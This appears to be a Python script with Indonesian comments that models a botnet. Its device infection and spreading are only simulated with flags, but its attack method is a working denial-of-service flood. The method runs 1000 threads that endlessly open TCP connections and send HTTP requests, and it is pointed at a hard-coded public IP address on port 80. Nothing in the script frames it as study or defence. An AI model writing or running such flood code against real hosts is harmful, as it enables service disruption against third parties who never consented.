import socket
import threading
import time

class BotMalware:
    def __init__(self, attack_rate):
        self.attack_rate = attack_rate

    def infect_device(self, device):
        # Mensimulasikan infeksi perangkat
        device.infected = True
        print(f"Perangkat {device.id} terinfeksi")

    def propagate(self, network):
        for device in network.uninfected_devices():
            self.infect_device(device)
            device.load_malware(self)
            # Menyebarkan malware ke perangkat lain
            time.sleep(1)  # Mensimulasikan waktu yang dibutuhkan untuk menyebar

    def launch_attack(self, target_ip, target_port):
        def attack():
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    sock.connect((target_ip, target_port))
                    sock.send(b"GET / HTTP/1.1\r\n")
                    # Tambahkan penanganan jika perlu
                except socket.error as e:
                    print(f"Socket error: {e}")
                finally:
                    sock.close()
                time.sleep(1 / self.attack_rate)

        threads = []
        for _ in range(1000):  # Jumlah thread untuk menyerang
            thread = threading.Thread(target=attack)
            thread.start()
            threads.append(thread)

        # Menunggu sampai semua thread selesai
        for thread in threads:
            thread.join()

class Device:
    def __init__(self, device_id):
        self.id = device_id
        self.infected = False
        self.malware = None

    def load_malware(self, malware):
        self.malware = malware

class Network:
    def __init__(self, devices):
        self.devices = devices

    def uninfected_devices(self):
        return [device for device in self.devices if not device.infected]

# Contoh penggunaan
if __name__ == "__main__":
    # Infeksi awal
    initial_devices = [Device(1), Device(2), Device(3)]
    malware = BotMalware(attack_rate=100)  # 100 paket per detik

    for device in initial_devices:
        malware.infect_device(device)

    # Fase penyebaran
    all_devices = initial_devices + [Device(i) for i in range(4,10)]
    network = Network(all_devices)
    malware.propagate(network)

    # Fase serangan
    target_ip = "103.191.63.128"  # Contoh IP target
    target_port = 80  # Contoh port target
    malware.launch_attack(target_ip, target_port)